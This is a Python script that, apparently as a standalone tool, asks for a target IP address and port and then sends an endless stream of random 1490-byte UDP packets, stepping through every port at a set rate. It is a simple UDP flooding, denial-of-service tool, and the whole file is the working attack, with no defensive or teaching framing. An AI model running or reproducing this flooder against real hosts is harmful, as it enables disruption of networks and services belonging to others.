import socket
import secrets
import time
from datetime import datetime

# Function to get current time
def get_current_time():
    now = datetime.now()
    return now.hour, now.minute, now.day, now.month, now.year

# Function to create a UDP socket
def create_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    return sock

# Function to get valid IP address from user
def get_target_ip():
    while True:
        ip = input("Enter target IP address: ")
        if ip:
            return ip
        else:
            print("Invalid input. Please enter a valid IP address.")

# Function to get valid port number from user
def get_target_port():
    while True:
        try:
            port = int(input("Enter target port number: "))
            if 0 <= port <= 65535:
                return port
            else:
                print("Invalid input. Please enter a valid port number between 0 and 65535.")
        except ValueError:
            print("Invalid input. Please enter a valid port number.")

# Main function to send packets
def send_packets(ip, port, rate_limit):
    sock = create_socket()
    sent = 0
    try:
        while True:
            # Generate random bytes
            bytes_to_send = secrets.token_bytes(1490)
            sock.sendto(bytes_to_send, (ip, port))
            sent += 1
            port = (port + 1) % 65536  # Increment port number and wrap around
            print(f"Sent {sent} packet to {ip} through port {port}")
            time.sleep(1 / rate_limit)  # Rate limiting
    except socket.error as e:
        print(f"Socket error: {e}")
    except KeyboardInterrupt:
        print("Packet sending stopped by user.")
    finally:
        sock.close()

if __name__ == "__main__":
    # Get current time (optional)
    get_current_time()

    # Get target IP and port
    target_ip = get_target_ip()
    target_port = get_target_port()

    # Set rate limit
    rate_limit = 100  # packets per second

    # Start sending packets
    send_packets(target_ip, target_port, rate_limit)